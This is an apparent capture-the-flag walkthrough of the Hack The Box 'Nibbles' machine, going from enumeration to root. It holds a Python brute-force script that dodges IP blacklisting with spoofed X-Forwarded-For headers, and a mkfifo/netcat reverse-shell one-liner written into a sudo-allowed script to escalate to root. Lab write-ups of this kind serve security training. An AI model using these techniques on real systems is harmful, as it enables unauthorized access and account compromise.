#NIBBLES

##Enumeration

Doing the nmap scan we get 2 open ports

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/nibbles]
└─$ nmap 10.10.10.75
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-04 05:23 EDT
Nmap scan report for 10.10.10.75
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.18 seconds
                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackthebox/nibbles]
└─$ nmap 10.10.10.75 -p 22,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-04 05:24 EDT
Nmap scan report for 10.10.10.75
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I also did the gobuster scan but counldn't find anything of interest

Taking a look at the source code of the http page we find a very interesting line 
```
< /nibbleblog/ directory. Nothing interesting here! -->
```
So we know that there is a nibbleblog directory which we can explore

Running gobuster on the ```/nibbleblog\``` directory 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/nibbles]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.75/nibbleblog/ -q
/.hta                 (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 306]
/admin.php            (Status: 200) [Size: 1401]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]                                            
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]  
/README               (Status: 200) [Size: 4628]                                              
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]  
```

Opening the ```/admin.php``` we find a login page 
While taking a look at the other directories and files I found that the username is ```admin``` and also that the maximum number of tries that can be done before our ip gets blacklisted is 5 
So that means we cannot bruteforce the password with burpsuit or hydra 

##LOGIN

Now we can write a script to generate random ip's

```
#!/usr/bin/env python3

from random import randint

import requests

# Brute force information
PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'
RATE_LIMIT = 5
RATE_LIMIT_ERROR = 'Blacklist protection'
LOGIN_FAILED_ERROR = 'Incorrect username or password.'

# Target information
RHOST = '10.10.10.75'
LOGIN_PAGE = '/nibbleblog/admin.php'
TARGET_URL = f'http://{RHOST}{LOGIN_PAGE}'
USERNAME = 'admin'


def attempt_login(password: str, ip: str) -> bool:
    """Performs a login using a given password.

    :param password: The password to try.
    :param ip: Spoof the attacker's IP address with this one.
    :return: True for a successful login, otherwise False.
    """
    headers = {'X-Forwarded-For': ip}
    payload = {'username': USERNAME, 'password': password}
    r = requests.post(
        TARGET_URL, headers=headers, data=payload
    )

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if RATE_LIMIT_ERROR in r.text:
        print("Rate limit hit, aborting!")
        exit(1)

    return LOGIN_FAILED_ERROR not in r.text


def random_ip() -> str:
    """Generate a random IP address.

    :return: A random IP address.
    """
    return ".".join(str(randint(0, 255)) for _ in range(4))


def run(start_at: int = 1):
    """Start the brute force process.

    :param start_at: Start brute forcing at the password with
     this 1-based index. The number represents the line in
     the password file.
    """
    ip: str = random_ip()
    num_attempts: int = 1

    for password in open(PASSWORD_LIST):
        if num_attempts < start_at:
            num_attempts += 1
            continue

        if num_attempts % (RATE_LIMIT - 1) == 0:
            ip = random_ip()

        password = password.strip()
        print(f"Attempt {num_attempts}: {ip}\t\t{password}")

        if attempt_login(password, ip):
            print(f"Password for {USERNAME} is {password}")
            break

        num_attempts += 1


if __name__ == '__main__':
    run()    
```
Alternatively we can also try some very common passwords 

The password we find is ```nibbles```

##SHELL

Now we need to upload a reverse shell for I found this article which tells exactly how to upload a reverse shell in nibbleblog https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/

Following this article I get a reverse shell on my machine

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/nibbles]
└─$ nc -lvnp 53               
listening on [any] 53 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.75] 40040
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:50:58 up  1:29,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/$ whoami
whoami
nibbler
```

##USER --> ROOT

Using the command ```sudo -l ``` to check what sudo permissions our user have
```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh    
```
This means our user can run monitor.sh file as root without password

```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ ls
ls
personal  personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ cd personal
cd personal
nibbler@Nibbles:/home/nibbler/personal$ ls
ls
stuff
nibbler@Nibbles:/home/nibbler/personal$ cd stuff
cd stuff
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
ls
monitor.sh
```

Now we can edit the file to produce a root shell for us

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '#!/bin/bash' > monitor.sh
echo '#!/bin/bash' > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 4444 > /tmp/f' >> monitor.sh
< /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 4444 > /tmp/f' >> monitor.sh         
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
```

And we have a root shell on our machine

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/nibbles]
└─$ nc -lvnp 4444                                             1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.75] 45874
# whoami
root
# cd /root       
# ls
root.txt
```